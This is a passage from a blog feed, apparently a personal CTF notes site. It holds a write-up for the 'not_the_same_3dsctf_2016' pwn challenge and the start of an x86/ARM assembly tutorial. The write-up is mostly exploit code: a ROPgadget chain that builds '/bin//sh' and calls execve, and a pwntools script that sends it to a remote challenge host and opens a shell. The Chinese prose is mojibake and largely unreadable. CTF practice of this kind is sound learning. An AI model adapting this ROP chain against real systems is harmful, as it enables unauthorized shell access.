    <content type="html"><![CDATA[<p><code>ROPgadget --binary not_the_same_3dsctf_2016 --ropchain</code></p><p>è‡ªåŠ¨ç”Ÿæˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br>p = <span class="hljs-string">&#x27;&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fcca</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08048b0b</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;/bin&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805586b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fcca</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb064</span>) <span class="hljs-comment"># @ .data + 4</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08048b0b</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;//sh&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805586b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fcca</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08049423</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805586b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080481ad</span>) <span class="hljs-comment"># pop ebx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fcf1</span>) <span class="hljs-comment"># pop ecx ; pop ebx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb060</span>) <span class="hljs-comment"># padding without overwrite ebx</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fcca</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08049423</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806d8a5</span>) <span class="hljs-comment"># int 0x80</span><br></code></pre></td></tr></table></figure><p>åŠ ä¸Šè‡ªå·±ç®—çš„åç§»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br>elf = ELF(<span class="hljs-string">&quot;./not_the_same_3dsctf_2016&quot;</span>)<br><span class="hljs-comment">#sh = process(&quot;./not_the_same_3dsctf_2016&quot;)</span><br>sh = remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26066</span>)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;i386&quot;</span><br>p = cyclic(<span class="hljs-number">0x2D</span>)<br>p += <span class="hljs-string">&#x27;&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fcca</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08048b0b</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;/bin&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805586b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fcca</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb064</span>) <span class="hljs-comment"># @ .data + 4</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08048b0b</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;//sh&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805586b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fcca</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08049423</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805586b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080481ad</span>) <span class="hljs-comment"># pop ebx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fcf1</span>) <span class="hljs-comment"># pop ecx ; pop ebx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb060</span>) <span class="hljs-comment"># padding without overwrite ebx</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fcca</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08049423</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806d8a5</span>) <span class="hljs-comment"># int 0x80</span><br>sh.sendline(p)<br>sh.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
      <category>å¤‡å¿˜</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ±‡ç¼–åŸºç¡€</title>
    <link href="/2020/01/13/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
    <url>/2020/01/13/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h2 id="X86æ±‡ç¼–åŸºç¡€"><a href="#X86æ±‡ç¼–åŸºç¡€" class="headerlink" title="X86æ±‡ç¼–åŸºç¡€"></a>X86æ±‡ç¼–åŸºç¡€</h2><p>==Intelå’ŒAT&amp;Tè¯­æ³•åŒºåˆ«ï¼š==</p><ul><li>Intel<strong>æ“ä½œæ•°</strong>åœ¨<strong>å‰é¢</strong>ï¼ŒAT&amp;Tçš„åœ¨åé¢</li></ul><blockquote><p>åœ¨Intelè¯­æ³•ä¸­ï¼š<instruction> <destination operand> <source operand><br>åœ¨AT&amp;Tè¯­æ³•ä¸­ï¼š<instruction> <source operand> <destination operand><br>æœ‰ä¸€ä¸ªç®€å•çš„è®°ä½å®ƒä»¬çš„æ–¹æ³•: å½“ä½ é¢å¯¹intelè¯­æ³•çš„æ—¶å€™ï¼Œä½ å¯ä»¥æƒ³è±¡æŠŠç­‰å·(=)æ”¾åˆ°2ä¸ªæ“ä½œæ•°ä¸­é—´ï¼Œå½“é¢å¯¹AT&amp;Tè¯­æ³•çš„æ—¶å€™ï¼Œä½ å¯ä»¥æ”¾ä¸€ä¸ªå³ç®­å¤´(â†’ï¼‰åˆ°ä¸¤ä¸ªæ“ä½œæ•°ä¹‹é—´ã€‚</p></blockquote><ul><li>AT&amp;T: å¯„å­˜å™¨åä¹‹å‰éœ€è¦å†™ä¸€ä¸ªç™¾åˆ†å·(%)å¹¶ä¸”åœ¨æ•°å­—å‰é¢éœ€è¦åŠ ä¸Šç¾å…ƒç¬¦($)ã€‚å¹¶ç”¨åœ†æ‹¬å·æ›¿ä»£æ–¹æ‹¬å·</li><li>AT&amp;T: ä»¥ä¸‹æ˜¯ä¸€äº›æ·»åŠ åˆ°æ“ä½œç¬¦åï¼Œç”¨æ¥è¡¨ç¤ºæ•°æ®å½¢å¼çš„åç¼€ï¼š<br>â€“ q â€” quad (64 bits)<br>â€“ l â€” long (32 bits)<br>â€“ w â€” word (16 bits)<br>â€“ b â€” byte (8 bits)</li></ul><hr><p><strong>é‡è¦ï¼š<code>MOV</code>æŒ‡ä»¤åœ¨64ä½æ¨¡å¼ä¸‹ï¼Œå¯¹ä½32ä½è¿›è¡Œå†™å…¥æ“ä½œçš„æ—¶å€™ï¼Œä¼šæ¸…ç©ºé«˜32ä½çš„å†…å®¹[Int13]ã€‚æ¯”å¦‚ <code>MOV EAXï¼Œ011223344h</code>å°†ä¼šæŠŠå€¼å†™åˆ°RAXé‡Œï¼Œå¹¶ä¸”æ¸…ç©ºRAXçš„é«˜32ä½åŒºåŸŸã€‚</strong></p><h3 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h3><blockquote><ol><li>EAXï¼š ç´¯åŠ å™¨</li><li>EBXï¼š åŸºå€å¯„å­˜å™¨</li><li>ECXï¼š è®¡æ•°å™¨</li><li>EDXï¼š æ•°æ®å¯„å­˜å™¨</li><li>ESIï¼š æºå˜å€å¯„å­˜å™¨</li><li>EDIï¼š ç›®çš„å˜å€å¯„å­˜å™¨</li><li>EBPï¼š æ‰©å±•åŸºå€æŒ‡é’ˆå¯„å­˜å™¨</li><li>ESPï¼š æ ˆæŒ‡é’ˆå¯„å­˜å™¨</li><li>EIPï¼š æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨</li></ol><p>å¤§å¤šæ•°å¯„å­˜å™¨å¤±å»äº†ç‰¹æ®Šç”¨é€”ï¼Œä½†<strong>ESP</strong>å’Œ<strong>EBP</strong>è¿˜æ˜¯æœ‰ç‰¹æ®Šç”¨é€”</p></blockquote><img src="/2020/01/13/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/image-20190821052642311.png" class="" title="image-20190821052642311"><h3 id="å†…å­˜å’Œå¯»å€æ¨¡å¼"><a href="#å†…å­˜å’Œå¯»å€æ¨¡å¼" class="headerlink" title="å†…å­˜å’Œå¯»å€æ¨¡å¼"></a>å†…å­˜å’Œå¯»å€æ¨¡å¼</h3><blockquote><p>.data</p><p>Var :</p><p>â€‹        .byte 64 ;  å£°æ˜ä¸€ä¸ªå­—èŠ‚å‹å˜é‡varï¼Œå¯¹åº”å€¼ä¸º64</p><p>â€‹        .byte 10 ï¼›å£°æ˜ä¸€ä¸ªæ•°æ®10ï¼Œè¿™ä¸ªæ•°æ®æ²¡æœ‰æ‰€è°“çš„â€œæ ‡ç­¾â€ï¼Œå®ƒçš„å†…å­˜åœ°å€å°±æ˜¯ var + 1.</p></blockquote><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">.<span class="hljs-keyword">byte</span>å£°æ˜<span class="hljs-number">1</span>ä¸ªå­—èŠ‚çš„æ•°æ®<br>.<span class="hljs-keyword">short</span>å£°æ˜<span class="hljs-number">2</span>ä¸ªå­—èŠ‚çš„æ•°æ®<br>.<span class="hljs-keyword">long</span>å£°æ˜<span class="hljs-number">4</span>ä¸ªå­—èŠ‚çš„æ•°æ®<br></code></pre></td></tr></table></figure><h4 id="æ“ä½œåç¼€"><a href="#æ“ä½œåç¼€" class="headerlink" title="æ“ä½œåç¼€"></a>æ“ä½œåç¼€</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">movb</span> $<span class="hljs-number">2</span>,(%ebx);å°†<span class="hljs-number">2</span>ç§»å…¥åˆ°ebxä¸­çš„å€¼æ‰€è¡¨ç¤ºçš„åœ°å€å•å…ƒä¸­<br><span class="hljs-attribute">movw</span> $<span class="hljs-number">2</span>,(%ebx); å°†<span class="hljs-number">16</span>ä½æ•´æ•°<span class="hljs-number">2</span>ç§»åŠ¨åˆ°ebxä¸­çš„å€¼æ‰€è¡¨ç¤ºçš„åœ°å€å•å…ƒå¼€å§‹çš„ä¸¤ä¸ªå­—èŠ‚ä¸­<br><span class="hljs-attribute">movl</span> $<span class="hljs-number">2</span>,(%ebx); å°†<span class="hljs-number">32</span>ä½æ•´æ•°<span class="hljs-number">2</span>ç§»åŠ¨åˆ° ebxä¸­çš„å€¼æ‰€è¡¨ç¤ºçš„åœ°å€å•å…ƒ å¼€å§‹çš„å››ä¸ªå­—èŠ‚ä¸­<br></code></pre></td></tr></table></figure><h2 id="æŒ‡ä»¤"><a href="#æŒ‡ä»¤" class="headerlink" title="æŒ‡ä»¤"></a>æŒ‡ä»¤</h2><h3 id="mov-lt-reg-lt-reg"><a href="#mov-lt-reg-lt-reg" class="headerlink" title="mov &lt;reg, &lt;reg"></a>mov &lt;reg, &lt;reg</h3><blockquote><p>mové»˜è®¤å¯¹å¯„å­˜å™¨å€¼æˆ–å˜é‡å€¼è¿›è¡Œæ“ä½œï¼Œå¯ä»¥ä»å¯„å­˜å™¨åˆ°å¯„å­˜å™¨ï¼Œä»ç«‹å³æ•°åˆ°å¯„å­˜å™¨ï¼Œä»å­˜å‚¨å•å…ƒåˆ°å¯„å­˜å™¨ï¼Œä»ç«‹å³æ•°åˆ°å­˜å‚¨å•å…ƒï¼Œä»å¯„å­˜å™¨åˆ°å­˜å‚¨å•å…ƒ</p></blockquote><p>å°†æ•°æ®ä»ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆå³å¯„å­˜å™¨ä¸­çš„å†…å®¹ï¼Œå†…å­˜å•å…ƒä¸­çš„å†…å®¹ï¼Œæˆ–è€…ä¸€ä¸ªå‚æ•°å€¼ï¼‰å¤åˆ¶åˆ°ç¬¬äºŒä¸ªå‚æ•°ï¼ˆå³å¯„å­˜å™¨æˆ–è€…å†…å­˜å•å…ƒï¼‰ã€‚</p><p>ä½†å¯„å­˜å™¨å¤åˆ¶åˆ°å¯„å­˜å™¨å¯è¡Œæ—¶ï¼Œç›´æ¥åœ°ä»å†…å­˜å•å…ƒä¸­å°†æ•°æ®ç§»åŠ¨åˆ°å¦ä¸€å†…å­˜å•å…ƒä¸­æ˜¯ä¸å¯ä»¥çš„ï¼Œå¿…é¡»æŠŠå†…å­˜å•å…ƒä¸­çš„æ•°æ®åŠ è½½åˆ°ä¸€ä¸ªå¯„å­˜å™¨ä¸­ï¼Œç„¶åæ‰å¯ä»¥é€šè¿‡å¯„å­˜å™¨æŠŠ<strong>æ•°æ®</strong>ç§»åŠ¨åˆ°ç›®æ ‡å†…å­˜å•å…ƒä¸­ã€‚</p><h3 id="push-å…¥æ ˆ"><a href="#push-å…¥æ ˆ" class="headerlink" title="push å…¥æ ˆ"></a>push å…¥æ ˆ</h3><p>pushå…ˆå°†ESPä¸­çš„å€¼å‡å°‘4ï¼Œç„¶åå°†push çš„å‚æ•°ç§»åŠ¨åˆ°ä¸€ä¸ª32ä½çš„åœ°å€å•å…ƒï¼ˆ%espï¼‰.espåœ°å€ä»é«˜åœ°å€åˆ°ä½åœ°å€é€æ¸å‡å°‘ï¼Œå°±åƒ1000åˆ°0ï¼Œå…ˆå 1000ï¼Œå†999â€¦â€¦ç©ºé—´æœ‰é™</p><h3 id="pop-å‡ºæ ˆ"><a href="#pop-å‡ºæ ˆ" class="headerlink" title="pop å‡ºæ ˆ"></a>pop å‡ºæ ˆ</h3><p>å…ˆå°†å†…å­˜ï¼ˆ%espï¼‰ä¸­4ä¸ªå­—èŠ‚çš„æ•°æ®æ”¾åˆ°æŒ‡å®šå¯„å­˜å™¨æˆ–è€…å†…å­˜å•å…ƒä¸­ï¼Œç„¶åè®©esp+4</p><h3 id="lea-åŠ è½½æœ‰æ•ˆåœ°å€"><a href="#lea-åŠ è½½æœ‰æ•ˆåœ°å€" class="headerlink" title="lea åŠ è½½æœ‰æ•ˆåœ°å€"></a>lea åŠ è½½æœ‰æ•ˆåœ°å€</h3><p>å°†å…¶ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šçš„å†…å­˜å•å…ƒ æ”¾å…¥åˆ° ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šçš„å¯„å­˜å™¨ä¸­ã€‚åªè®¡ç®—æœ‰æ•ˆåœ°å€å¹¶å°†å…¶æ”¾å…¥å¯„å­˜å™¨ä¸­ã€‚</p><h3 id="leaå’Œmovçš„åŒºåˆ«"><a href="#leaå’Œmovçš„åŒºåˆ«" class="headerlink" title="leaå’Œmovçš„åŒºåˆ«"></a>leaå’Œmovçš„åŒºåˆ«</h3><p>mov:</p><ul><li>å¯¹äºå˜é‡ï¼Œæœ‰æ— [ ] éƒ½æ˜¯å–å€¼</li><li>å¯¹äºå¯„å­˜å™¨ï¼Œæ— [ ] è¡¨ç¤ºå–å€¼ï¼Œæœ‰[ ] è¡¨ç¤ºå–åœ°å€</li></ul><p>Lea:</p><ul><li>å¯¹äºå˜é‡ï¼Œæœ‰æ—  éƒ½æ˜¯å–åœ°å€</li><li>å¯¹äºå¯„å­˜å™¨ï¼Œæ— [ ]è¡¨ç¤ºå–åœ°å€ï¼Œæœ‰[ ] è¡¨ç¤ºå–å€¼</li></ul><h3 id="imul-æ•´æ•°ç›¸ä¹˜"><a href="#imul-æ•´æ•°ç›¸ä¹˜" class="headerlink" title="imul æ•´æ•°ç›¸ä¹˜"></a>imul æ•´æ•°ç›¸ä¹˜</h3><ul><li>ä¸¤ä¸ªå‚æ•°çš„ï¼šå…ˆå°†ä¸¤ä¸ªå‚æ•°ç›¸ä¹˜ï¼Œç„¶åæŠŠç»“æœå­˜åœ¨ç¬¬äºŒä¸ªå‚æ•°ï¼ˆå¿…é¡»æ˜¯ä¸€ä¸ªå¯„å­˜å™¨ï¼‰ä¸­</li><li>ä¸‰ä¸ªå‚æ•°çš„ï¼šç¬¬ä¸€ä¸ªï¼ˆå¿…é¡»æ˜¯å¸¸æ•°ï¼‰å’Œç¬¬äºŒä¸ªå‚æ•°ç›¸ä¹˜ï¼Œå­˜åœ¨ç¬¬ä¸‰ä¸ªå‚æ•°ï¼ˆå¯„å­˜å™¨ä¸­ï¼‰</li></ul><h3 id="idiv-æ•´æ•°ç›¸é™¤"><a href="#idiv-æ•´æ•°ç›¸é™¤" class="headerlink" title="idiv æ•´æ•°ç›¸é™¤"></a>idiv æ•´æ•°ç›¸é™¤</h3><p>åªæœ‰ä¸€ä¸ªæ“ä½œæ•°ï¼Œä¸ºé™¤æ•°ï¼Œè¢«é™¤æ•°ä¸ºEDXï¼šEAXä¸­çš„å†…å®¹ï¼Œå•†å­˜åœ¨EAXä¸­ï¼Œä½™æ•°å­˜åœ¨EDX</p><h3 id="shlï¼Œshr-æŒ‰ä½å·¦ç§»æˆ–è€…å³ç§»"><a href="#shlï¼Œshr-æŒ‰ä½å·¦ç§»æˆ–è€…å³ç§»" class="headerlink" title="shlï¼Œshr æŒ‰ä½å·¦ç§»æˆ–è€…å³ç§»"></a>shlï¼Œshr æŒ‰ä½å·¦ç§»æˆ–è€…å³ç§»</h3><p>å¯¹ç¬¬ä¸€ä¸ªå‚æ•°è¿›è¡Œä½è¿ç®—ï¼Œç§»åŠ¨ä½æ•°ç”±ç¬¬äºŒä¸ªå‚æ•°å†³å®š</p><hr><h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><p><code>STMFD SP!, &#123;R4, LR&#125;</code>ï¼Œè¿™æ¡æŒ‡ä»¤ç±»ä¼¼x86å¹³å°çš„<code>PUSH</code>æŒ‡ä»¤ï¼Œå®ƒä¼šæŠŠ2ä¸ªå¯„å­˜å™¨ï¼ˆR4å’ŒLRï¼‰çš„å€¼å†™åˆ°æ ˆé‡Œã€‚ä¸è¿‡ä¸ºäº†ç®€åŒ–ï¼Œåœ¨<code>armcc</code>ç¼–è¯‘å™¨è¾“å‡ºçš„æ±‡ç¼–ä»£ç é‡Œä¼šå†™æˆ`PUSH {R4, LR}</p><p>è¿™æŒ‡ä»¤é¦–å…ˆä¼šå‡å°‘<code>SP</code>çš„å€¼ï¼Œè¿™æ ·å®ƒåœ¨æ ˆä¸­æŒ‡å‘çš„ç©ºé—´å°±è¢«é‡Šæ”¾ï¼Œä»¥ç•™ç»™æ–°æ¡ç›®ä½¿ç”¨ï¼Œç„¶åå°†R4å’ŒLRçš„å€¼å­˜å…¥è¢«ä¿®æ”¹åçš„<code>SP</code>çš„å‚¨å­˜åŒºåŸŸä¸­ã€‚</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼š<code>STMFD</code>æŒ‡ä»¤æ˜¯å¹¿ä¹‰çš„<code>PUSH</code>æŒ‡ä»¤(æ‰©å±•äº†å®ƒçš„åŠŸèƒ½)ï¼Œå› ä¸ºä»–èƒ½æ“ä½œä»»ä½•å¯„å­˜å™¨ï¼Œä¸åªæ˜¯<code>SP</code>ã€‚æ¢å¥è¯è¯´ï¼Œ<code>STMFD</code>å¯ä»¥ç”¨äºå°†ä¸€ç»„å¯„å­˜å™¨å‚¨å­˜åœ¨ç‰¹å®šçš„å†…å­˜åœ°å€ä¸Šã€‚</p><p><code>MOV R0ï¼Œ #0</code>è¿™æ¡è¯­å¥ï¼Œè¿™æ¡è¯­å¥å°±æ˜¯æŠŠ0å†™å…¥R0å¯„å­˜å™¨ã€‚è¿™æ˜¯å› ä¸ºCå‡½æ•°è¿”å›äº†0ï¼Œè¿”å›å€¼ä¼šæ”¾åœ¨R0é‡Œã€‚</p><p>æœ€åä¸€æ¡æŒ‡ä»¤æ˜¯<code>LDMFD SP!, 